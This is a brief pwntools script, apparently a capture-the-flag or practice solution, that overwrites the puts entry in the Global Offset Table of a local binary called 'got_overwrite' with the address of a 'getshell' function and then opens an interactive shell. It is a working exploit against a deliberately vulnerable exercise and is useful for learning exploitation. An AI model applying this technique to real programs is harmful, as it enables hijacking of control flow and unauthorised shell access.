from pwn import *

p = process("./got_overwrite")

puts_got = 0x404018
getshell = 0x40121b

p.recvuntil(b"addr : ")
p.sendline(str(puts_got))
p.recvuntil(b"value : ")
p.sendline(str(getshell))

p.interactive()